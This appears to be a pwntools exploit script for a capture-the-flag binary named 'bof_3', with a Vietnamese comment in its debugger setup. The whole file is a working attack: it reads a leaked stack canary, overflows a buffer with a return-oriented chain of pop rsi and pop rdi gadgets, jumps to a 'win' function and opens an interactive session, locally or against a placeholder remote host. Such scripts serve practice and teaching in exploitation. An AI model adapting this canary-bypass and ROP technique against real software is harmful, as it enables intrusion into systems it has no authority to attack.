#!/usr/bin/env python3
from pwn import *

exe_path = './bof_3'

HOST = 'example.com/ip'
PORT = 1337

exe = ELF(exe_path, checksec=False)
context.binary = exe

gdbscript = '''
# Break tại main hoặc địa chỉ cụ thể
break *main
# break *win
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        p = process(exe.path)
        return p
    return process(exe.path)

p = start()

# add payload, script here
a1 = a2 = 0xdeadbeefdeadbeef
pop_rsi = 0x000000000040120e
pop_rdi = 0x0000000000401205

win_addr = 0x0000000000401213

c = p.recvline()
canary = int(c.split()[-1], 16)

log.success(f"canary: {hex(canary)}")

payload = 0x58*b'A' + p64(canary) + 8*b'B' + p64(pop_rsi) + p64(a1) + p64(pop_rdi) + p64(a2) + p64(win_addr+5) + (256-0x58-8*7)*b'\x00'

p.sendafter(b'Enter your favorite number: ', payload)

p.interactive()
